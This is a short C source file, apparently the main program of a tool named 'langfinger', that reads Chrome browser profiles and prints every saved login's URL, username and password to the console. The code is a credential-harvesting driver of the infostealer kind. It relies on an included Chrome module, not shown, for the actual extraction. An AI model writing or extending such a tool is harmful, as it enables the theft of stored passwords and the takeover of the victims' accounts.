#include "LF_Chrome.c"

// LF_[Module]_[Function]  = public
// LF_[Module]__[Function] = private

int
main ()
{
  printf ("langfinger v0.0.1\n");

  struct LF_Chrome_data_struct chrome_data;
  LF_Chrome_populate_data (&chrome_data);

  if (chrome_data.profile_path_list->length == 0)
    {
      printf ("No profiles found.\n");
      return 0;
    }

  for (int i = 0; i < chrome_data.profile_path_list->length; i++)
    {
      char *profile_path
          = LF_Utils_arraylist_get (chrome_data.profile_path_list, i);
      printf ("Profile: %s\n", profile_path);
    }

  for (int i = 0; i < chrome_data.login_data_list->length; i++)
    {
      struct LF_Chrome_login_data_struct *login_data
          = LF_Utils_arraylist_get (chrome_data.login_data_list, i);
      printf ("[login] %s\n", login_data->action_url);
      printf ("            %s\n", login_data->username_value);
      printf ("            %s\n", login_data->password_value);
    }

  LF_Chrome_free_data (&chrome_data);
  return 0;
}
